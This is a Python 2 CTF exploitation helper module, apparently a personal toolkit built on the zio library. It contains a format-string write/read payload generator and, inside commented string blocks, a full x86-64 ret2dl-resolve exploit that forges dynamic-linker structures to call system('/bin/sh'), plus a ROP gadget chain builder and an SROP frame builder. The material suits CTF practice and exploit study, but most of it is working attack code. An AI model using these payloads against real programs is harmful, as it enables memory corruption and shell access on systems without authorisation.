#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-

'''
By Icemakr

This is a useless script for my daily pwning in CTFs:(

Note that I use zio instead of pwntool because of its lightweight.
'''

# zio is awesome
from zio import *

# print
BLUE    = COLORED(RAW, color = 'blue', attrs = ['bold'])
GREEN   = COLORED(RAW, color = 'green', attrs = ['bold'])
CYAN    = COLORED(RAW, color = 'cyan', attrs = ['bold'])
RED     = COLORED(RAW, color = 'red', attrs = ['bold'])
MAGENTA = COLORED(RAW, color = 'magenta', attrs = [])

# extension for zio
# write
def w(self, s): 
    self.write(s)

# writeline
def pr(self, *args): 
    if len(args) == 0:
        self.writeline()
    for stuff in args:
        if isinstance(stuff, (int, long)):
            self.writeline(str(stuff)) 
        elif isinstance(stuff, (list, tuple)): 
            self.writelines( [str(i) if isinstance(i, (int, long)) else i for i in stuff] )
        else:
            self.writeline(stuff)

# read
def r(self, size = None, timeout = -1):
    return self.read(size, timeout)

# readline
def rl(self, size = 1):
    return self.read_line(size)

# read_until
def ru(self, pattern_list, timeout = -1, searchwindowsize = None):
    return self.read_until(pattern_list, timeout, searchwindowsize)

def hint(self, breakpoints = None, relative = None, extras = None):
    self.gdb_hint(breakpoints, relative, extras)


# main
setattr(zio, 'w', w)
setattr(zio, 'pr', pr)
setattr(zio, 'r', r)
setattr(zio, 'rl', rl)
setattr(zio, 'ru', ru)
setattr(zio, 'hint', hint)

# utilities
def info_leak(arg1, arg2):
    print BLUE("[_] {} => {}".format(arg1, arg2))

def info_found(arg1, arg2):
    print GREEN("[+] {} :".format(arg1).ljust(0x20, ' ') + "{}".format(hex(arg2)))

def info_shell():
    print CYAN("\n[*] enjoy your shell ~")

# get format string
def fmt(mod, offset = 0, target_val = 0, width = 4):
    if mod == 'w':
        if width == 1:
            fmt = '%0{}x%{}$hhn'.format(target_val, offset)
        elif width == 2:
            fmt = '%0{}x%{}$hn'.format(target_val, offset)
        elif width == 4:
            fmt = '%0{}x%{}$n'.format(target_val, offset)
        elif width == 8:
            fmt = '%0{}x%{}$lln'.format(target_val, offset)
        else:
            print 'offset invalid:('
    elif mod == 'r':
        fmt = '%{}$p'.format(offset)
    else:
        print 'mode invalid:('
    return fmt

def get_remote_hint(fn, port):
    def remote_hint(breakpoint):
        import os
        command_p = ''
        for i in xrange(len(breakpoint)):
            command_p = command_p + "b *0x%x\n" % breakpoint[i]
        command = '''set architecture arm\nset gnutarget elf32-littlearm\nfile ./%s\ntarget remote 0:%d\n''' % (fn, port)
        command = command + command_p
        tmp_script  = "/tmp/remote-debug-%s" %fn
        os.system("touch %s" % tmp_script)
        fp = open(tmp_script, "w")
        fp.write(command)
        fp.close()
        print MAGENTA("ggdb -command %s" % tmp_script)
        raw_input()
    return remote_hint

#     print MAGENTA('''
# ggdb -ex "set architecture arm" -ex "set gnutarget elf32-littlearm" -ex "file %s" -ex "target remote 0:%d" -ex "b *0x%x"
#     ''' % (fn, port, breakpoint))

'''
common gadget @ __libc_csu_init

def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += l64(0x0)     # rbx be 0x0
    payload += l64(0x1)     # rbp be 0x1
    payload += l64(jmp2)    # r12 jump to
    payload += l64(arg3)    # r13 -> rdx    arg3
    payload += l64(arg2)    # r14 -> rsi    arg2
    payload += l64(arg1)    # r15 -> edi    arg1
    payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
    payload += 'A' * 56     # junk
    return payload
'''

'''
# x86-64 dl-resolve demo

junk        = 0x48

plt_puts    = 0x0000000000400500
plt_resolve = 0x00000000004004f0
got_read    = 0x0000000000601028
got_puts    = 0x0000000000601018
got_linkmap = 0x0000000000601008

leave_ret   = 0x000000000040068c
pop_rbp_ret = 0x0000000000400595
pop_rdi_ret = 0x0000000000400763 
p4_ret      = 0x000000000040075c

adr_stage   = 0x0000000000601000 + 0x800

adr_rel_plt         = 0x0000000000400450
adr_dyn_sym         = 0x00000000004002c0
adr_dyn_str         = 0x0000000000400380
adr_fake_rel_plt    = adr_stage + 0x100
adr_fake_dyn_sym    = adr_stage + 0x208
adr_fake_dyn_str    = adr_stage + 0x300
adr_shell           = adr_stage + 0x400

com_part1           = 0x40075a
com_part2           = 0x400740

adr_entry           = 0x400550

def prepare(address):
    payload0  = 'A' * junk
    payload0 += l64(pop_rdi_ret)
    payload0 += l64(address)
    payload0 += l64(plt_puts)
    payload0 += l64(adr_entry)
    payload0  = payload0.ljust(0xc8, 'A')
    io.w(payload0)
    io.rl()

def leak(address, size):
    count       = 0
    buf         = ''
    while count < size:
        prepare(address + count)
        # leak(str(address + count))
        while True:
            ch = io.read(1, timeout = 0x10)
            #print ch
            count += 1
            if ch == '\n':
                buf += '\x00'
                break
            else:
                buf += ch[0]
    #print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
    leak_data = buf[:size]
    return leak_data

# for printf (puts)...
def leak(address, size):
    count       = 0
    buf         = ''
    while count < size:
        leak_prepare(address + count)
        data = io.ru('WelCome')[:-7] # get the whole data
        buf += (data[:-1] + '\x00') # newline
        count += (len(data[:-1]) + 1)
    leak_data = buf[:size]
    print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
    return leak_data

def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += l64(0x0)     # rbx be 0x0
    payload += l64(0x1)     # rbp be 0x1
    payload += l64(jmp2)    # r12 jump to
    payload += l64(arg3)    # r13 -> rdx    arg3
    payload += l64(arg2)    # r14 -> rsi    arg2
    payload += l64(arg1)    # r15 -> edi    arg1
    payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
    payload += 'A' * 56     # junk
    return payload

adr_linkmap = l64(leak(got_linkmap, 0x8))
print '[+] leak link_map\t:\t' + hex(adr_linkmap)

# overwrite link_map+0x1c8 0x0, read fake structure
payload0  = 'A' * junk
payload0 += com_gadget(com_part1, com_part2, got_read,
        arg1 = 0x0,
        arg2 = adr_linkmap + 0x1c8,
        arg3 = 0x8)
payload0 += l64(adr_entry)
payload0  = payload0.ljust(0xc8, 'A')
io.w(payload0)
io.rl()
io.w(l64(0x0))

payload0  = 'A' * junk
payload0 += com_gadget(com_part1, com_part2, got_read,
        arg1 = 0x0,
        arg2 = adr_stage,
        arg3 = 0x500)
payload0 += l64(adr_entry)
payload0  = payload0.ljust(0xc8, 'A')
io.w(payload0)
io.rl()

payload0  = 'A' * junk
payload0 += l64(pop_rbp_ret)
payload0 += l64(adr_stage)
payload0 += l64(leave_ret)
payload0  = payload0.ljust(0xc8, 'A')

# fake structure
align_rel_plt   = 0x8*3 - (adr_fake_rel_plt - adr_rel_plt) % (0x8 * 3)
payload1  = 'A' * 0x8
payload1 += l64(pop_rdi_ret) # set $rdi "/bin/sh"
payload1 += l64(adr_shell)
payload1 += l64(plt_resolve)
payload1 += l64((adr_fake_rel_plt - adr_rel_plt + align_rel_plt) / (0x8 * 3))
payload1 += l64(0xdeadbeef)
payload1  = payload1.ljust(0x100, 'A')

align_dyn_sym   = 0x8*3 - (adr_fake_dyn_sym - adr_dyn_sym) % (0x8 * 3)
payload1 += 'A' * align_rel_plt
payload1 += l64(got_read)
payload1 += l64((adr_fake_dyn_sym - adr_dyn_sym + align_dyn_sym)/(0x8*3)*0x100000000 + 0x7)
payload1  = payload1.ljust(0x208, 'A')

payload1 += 'A' * align_dyn_sym
payload1 += l32(adr_fake_dyn_str - adr_dyn_str)
payload1 += l32(0x12)
payload1 += l64(0x0)
payload1 += l64(0x0)
payload1  = payload1.ljust(0x300, 'A')

payload1 += 'system\x00'
payload1  = payload1.ljust(0x400, 'A')

payload1 += '/bin/sh\x00'

payload1  = payload1.ljust(0x500, 'A')

io.w(payload1)

io.w(payload0)
io.rl()

io.interact()
'''

'''
firstly set rax to  0xf
def srop_frame(arg1, arg2, arg3, rax, rip, rsp):
    frame    = 'A' * 8 * 5
    frame   += l64(0x0)         # r8
    frame   += l64(0x0)         # r9
    frame   += l64(0x0)         # r10
    frame   += l64(0x0)         # r11
    frame   += l64(0x0)         # r12
    frame   += l64(0x0)         # r13
    frame   += l64(0x0)         # r14
    frame   += l64(0x0)         # r15
    frame   += l64(arg1)        # rdi
    frame   += l64(arg2)        # rsi
    frame   += l64(0x0)         # rbp
    frame   += l64(0x0)         # rbx
    frame   += l64(arg3)        # rdx
    frame   += l64(rax)         # rax
    frame   += l64(0x0)         # rcx
    frame   += l64(rsp)         # rsp
    frame   += l64(rip)         # rip
    frame   += l64(0x0)         # eflag
    frame   += l64(0x2b0033)    # ssgscs
    frame   += l64(0) * 6
    return frame
'''

def mk(target, debug = True):
    if debug:
        return zio(target, print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'yellow'), timeout = 10000)
    else:
        return zio(target, print_read = False, print_write = False, timeout = 10000)

__all__ = ['get_remote_hint', 'fmt', 'info_shell', 'info_leak', 'info_found', 'mk', 'stdout', 'log','l8', 'b8', 'l16', 'b16', 'l32', 'b32', 'l64', 'b64', 'zio', 'EOF', 'TIMEOUT', 'SOCKET', 'PROCESS', 'REPR', 'EVAL', 'HEX', 'UNHEX', 'BIN', 'UNBIN', 'RAW', 'NONE', 'COLORED', 'PIPE', 'TTY', 'TTY_RAW', 'cmdline']
